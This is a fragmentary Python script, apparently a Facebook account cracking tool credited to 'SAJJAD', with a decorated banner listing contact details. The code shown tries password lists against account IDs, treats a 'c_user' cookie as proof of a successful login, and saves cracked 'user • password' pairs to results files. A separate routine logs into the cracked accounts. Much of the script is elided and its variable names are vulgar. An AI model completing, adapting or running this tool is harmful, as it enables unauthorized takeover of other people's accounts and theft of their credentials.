...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n{N} ▌│█║▌║▌║SAJJAD FACEBOOK METHOD║▌║▌║█│▌{N} """)
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{H}•{P}] Author    : SAJJAD            {N}║")
    print(f"║{P}[{H}•{P}] Whatsapp  : +8801840215106         {N}║")
    print(f"║{P}[{H}•{P}] Github    : github.com/SHAHZADA-AHMED{N}  ║")
    print(f"║{P}[{H}•{P}] SC Status : Gratis rasa {H}SAJJAD{P}     {N}║")
    print(f"║{P}[{H}•{P}] Support   : 32 & 64              {N}║")
    print(f"║{P}[{H}•{P}] Network   : {H}IM3{N}, {H}AXIS/XL/TSEL{N}, {H}3{N}         ║")
    print(f"║{P}[{H}•{P}] SC Version: V-1.1({K}SAJU ars {P})            {N}║")
    print("╚════════════════════════════════════════╝")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCRACK BY SAJJAD META SC SELESAI...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[SAJJAD-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[SAJJAD-CP] ", ""), titid[1])
...
###### CEK HASIL CRACK #####
        ...
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[SAJJAD-OK] ","\x1b[1;92m[SAJJAD-OK] ").replace("[SAJJAD-CP] ", "\x1b[1;93m[SAJJAD-CP] ")
    ...
    if "c_user" in session.cookies.get_dict():
        ...
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                ...
                open('results/ERROR.txt', 'a').write(f"[SAJJAD-CP] {user} • {pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f"[SAJJAD-CP] {user} • {pasw}\n")
        ...
        open('results/INVALID-OK.txt', 'a').write(f"[SAJJAD-CP] {user} • {pasw}\n")
#UBAH PW
...
# METODE SANDI MANUAL
    def plerr(self,id):
        ...
        if ___yayanganteng___ in ('raraY', 'raray'):
            ...
            print(' %s[%s!%s] Use %sKOMMA%s for separator\n [%s•%s] Example : %sSAJJAD123%s,%ssayang%s,%sbismillah'%(N,M,N,H,N,H,N,H,N,H,N,H))
            while True:
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[SAJJAD-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
